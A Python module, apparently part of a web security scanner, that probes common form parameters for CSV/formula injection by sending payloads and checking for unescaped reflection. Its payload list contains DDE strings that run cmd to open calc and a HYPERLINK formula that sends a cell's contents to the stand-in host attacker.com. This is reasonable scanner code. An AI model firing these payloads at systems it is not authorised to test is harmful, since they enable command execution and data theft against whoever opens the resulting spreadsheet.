import asyncio
from modules.core import console

# CSV Injection / Formula Injection
# Vulnerability: User input is saved to CSV/Excel without sanitization.
# If opened in Excel, cells starting with =, +, -, @ execute as formulas.
# Impact: RCE (DDE), Data Exfiltration.

CSV_PAYLOADS = [
    "=cmd|'/C calc'!A0",       # Classic DDE Calc Pop
    "+cmd|'/C calc'!A0",
    "-cmd|'/C calc'!A0",
    "@SUM(1+1)*cmd|'/C calc'!A0",
    "=HYPERLINK(\"http://attacker.com?leak=\"&A1, \"Click Me\")"
]

async def check_csv_injection(session, url, param):
    try:
        # This is hard to detect via HTTP response alone because the vulnerability triggers
        # *when the admin opens the file*.
        # However, we can check if the payload is *reflected* back cleanly without quoting or escaping.
        
        for payload in CSV_PAYLOADS:
            target = f"{url}?{param}={payload}"
            if "?" in url: target = f"{url}&{param}={payload}"
            
            async with session.get(target, timeout=5, ssl=False) as resp:
                text = await resp.text()
                
                # If we see the payload reflected EXACTLY as is, it's a potential risk.
                # Safe CSVs usually wrap in quotes: "=cmd..." -> " =cmd..."
                # Or escape the equals: '=cmd
                
                if payload in text:
                     # Heuristic: If it's inside a CSV context? 
                     # Hard to know context, but raw reflection of DDE payloads is bad practice generally.
                     return {
                        "url": target,
                        "param": param,
                        "type": "CSV Injection (Potential)",
                        "payload": payload,
                        "evidence": "Payload reflected without escaping"
                    }

    except Exception:
        pass
    return None

async def scan_csv_injection(session, url):
    """
    Scan for CSV/Formula Injection.
    """
    console.print(f"\n[bold cyan]--- CSV Injection Scanner ---[/bold cyan]")
    
    params = ["name", "firstname", "lastname", "email", "address", "city", "description", "comment"]
    
    tasks = [check_csv_injection(session, url, p) for p in params]
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] CSV INJECTION RISK: {res['param']}[/bold red]")
             console.print(f"      Payload: {res['payload']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No raw reflection of CSV formulas detected.[/dim]")
        
    return found
